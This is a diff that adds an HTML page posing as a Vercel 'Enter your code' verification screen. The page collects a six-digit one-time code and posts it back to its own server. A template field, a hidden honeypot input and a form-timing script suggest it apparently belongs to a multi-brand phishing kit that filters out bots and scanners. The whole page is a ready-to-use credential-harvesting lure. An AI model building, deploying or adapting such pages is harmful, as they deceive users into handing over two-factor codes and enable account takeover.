@@ -1,0 +1,63 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Verify it is you - Vercel</title>
+<meta name="theme-color" content="#000000">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%20viewBox%3D%270%200%2064%2064%27%3E%3Crect%20width%3D%2764%27%20height%3D%2764%27%20rx%3D%2714%27%20fill%3D%27%23000000%27/%3E%3Ctext%20x%3D%2732%27%20y%3D%2744%27%20font-family%3D%27Helvetica%2CArial%2Csans-serif%27%20font-size%3D%2734%27%20font-weight%3D%27700%27%20fill%3D%27%23fff%27%20text-anchor%3D%27middle%27%3EV%3C/text%3E%3C/svg%3E">
+<link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%20viewBox%3D%270%200%2064%2064%27%3E%3Crect%20width%3D%2764%27%20height%3D%2764%27%20rx%3D%2714%27%20fill%3D%27%23000000%27/%3E%3Ctext%20x%3D%2732%27%20y%3D%2744%27%20font-family%3D%27Helvetica%2CArial%2Csans-serif%27%20font-size%3D%2734%27%20font-weight%3D%27700%27%20fill%3D%27%23fff%27%20text-anchor%3D%27middle%27%3EV%3C/text%3E%3C/svg%3E">
+<meta property="og:title" content="Verify it is you - Vercel">
+<meta property="og:site_name" content="Vercel">
+<style>
+  body { margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#f0f2f5;padding:20px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; }
+  .card { background:#fff;width:100%;max-width:420px;border-radius:8px;padding:40px 36px;text-align:center;box-shadow:0 12px 40px rgba(0,0,0,.10); }
+  .mark { display:flex;justify-content:center;margin:0 0 20px; }
+  h1 { font-size:20px;margin:0 0 8px;color:#1c1e21;font-weight:600; }
+  p { color:#65676b;font-size:14px;line-height:1.55;margin:0 0 22px; }
+  .otp { display:flex;gap:8px;justify-content:center;margin-bottom:20px; }
+  .otp input { width:44px;height:52px;text-align:center;font-size:20px;border:1px solid #ccd0d5;border-radius:8px;outline:none;background:#fff;color:#1c1e21; }
+  .otp input:focus { border-color:#000000; }
+  button { width:100%;padding:13px;font-size:16px;font-weight:600;color:#fff;background:#000000;border:0;border-radius:8px;cursor:pointer; }
+  .resend { margin-top:14px;font-size:13px;color:#65676b; }
+  .resend a { color:#000000;text-decoration:none; }
+</style>
+</head>
+<body>
+<form class="card" method="POST" action="/">
+  <div class="mark"><svg viewBox="0 0 111 40" width="111" height="40" role="img" aria-label="Vercel"><text x="0" y="30" font-family="Arial,Helvetica,sans-serif" font-size="30" font-weight="700" fill="#000000" letter-spacing="-0.5">Vercel</text></svg></div>
+  <h1>Enter your code</h1>
+  <p>We sent a code to your phone and email. Enter it to finish </p>
+  <div class="otp">
+    <input name="otp_1" maxlength="1" inputmode="numeric" autofocus>
+    <input name="otp_2" maxlength="1" inputmode="numeric">
+    <input name="otp_3" maxlength="1" inputmode="numeric">
+    <input name="otp_4" maxlength="1" inputmode="numeric">
+    <input name="otp_5" maxlength="1" inputmode="numeric">
+    <input name="otp_6" maxlength="1" inputmode="numeric">
+  </div>
+  <button type="submit">Verify</button>
+
+  <input class="hp" type="text" name="hp_email" value="" tabindex="-1" autocomplete="off">
+  <input type="hidden" name="_tpl" value="vercel">
+  <input type="hidden" name="_ts" value="__TS__">
+  <div class="resend">Didn't get a code? <a href="#">Resend</a></div>
+
+<script>
+/* honeypot + human-timing beacon: if a bot autofills the hidden field we still
+   record it, and we log how long the form was open (bot forms are instant). */
+(function(){
+  var t0 = Date.now();
+  var f = document.querySelector('form');
+  if(!f) return;
+  f.addEventListener('submit', function(){
+    var el = f.querySelector('input[name=_ts]');
+    if(el) el.value = String(Date.now() - t0);
+  });
+})();
+</script>
+</form>
+</body>
+</html>
